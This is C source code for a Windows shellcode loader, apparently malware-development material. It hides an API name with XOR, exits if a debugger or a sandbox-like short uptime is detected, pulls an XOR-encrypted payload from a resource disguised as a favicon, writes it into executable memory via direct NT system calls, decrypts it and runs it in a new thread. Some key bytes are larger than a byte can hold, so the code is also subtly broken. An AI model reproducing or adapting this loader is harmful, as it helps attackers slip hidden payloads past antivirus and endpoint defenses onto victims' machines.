#include "syscalls.h"
#include "resource.h"

void xor (char* content, size_t content_size, char* key, int key_size)
{
	for (int i = 0; i < content_size; i++)
	{
		content[i] = content[i] ^ key[i % key_size];
	}
}


HANDLE(WINAPI* pGetCurrentProcess)();

int WINAPI wWinMain()
{
	char sGetCurrentProcess[] = {0x3d, 0x10, 0x22, 0x12, 0xc, 0x28, 0x37, 0x37, 0x3, 0x3e, 0x3e, 0x22, 0x3a, 0x21, 0x12, 0x3e, 0x9};

	unsigned char key[] = { 0x05, 0x10, 0x45, 0x89, 0x64, 0x32, 0x115, 0x210, 0x175, 0x112, 0x176 };
	char keyFunc[] = { 0x7A, 0x75, 0x56, 0x51, 0x79, 0x5A, 0x45, 0x52, 0x6D, 0x4A, 0x6E, 0x50, 0x55, 0x42, 0x77, 0x4D };

	xor(sGetCurrentProcess, sizeof(sGetCurrentProcess), keyFunc, sizeof(keyFunc));
	pGetCurrentProcess = GetProcAddress(GetModuleHandleA("kernel32.dll"), sGetCurrentProcess);

	HANDLE hProc = pGetCurrentProcess();
	
	PVOID addr = NULL;
	HANDLE thandle = NULL;
	size_t length = 0;
	unsigned char* payload;
	
	//Anti-Debug de Wish
	if (IsDebuggerPresent())
	{
		MessageBoxA(NULL, "Execute ca en admin !!", "Fais pas le relou", MB_ICONEXCLAMATION);
		return 0;
	}
	
	//Anti-VM de Aliexpress
	Sleep(4520);
	int _TimeStart = GetTickCount();
	if (_TimeStart < 4500)
	{
		return 0;
	}
	
	HRSRC myRes = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	HGLOBAL resHandle = LoadResource(NULL, myRes);
	payload = (char*)LockResource(resHandle);
	length = SizeofResource(NULL, myRes);

	NtAllocateVirtualMemory(hProc, &addr, 0, (PSIZE_T)&length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(hProc, addr, payload, length, NULL);
	xor((char*)addr, length, key, sizeof(key));
	NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, addr, NULL, FALSE, 0, 0, 0, NULL);
	NtWaitForSingleObject(thandle, TRUE, 0);
}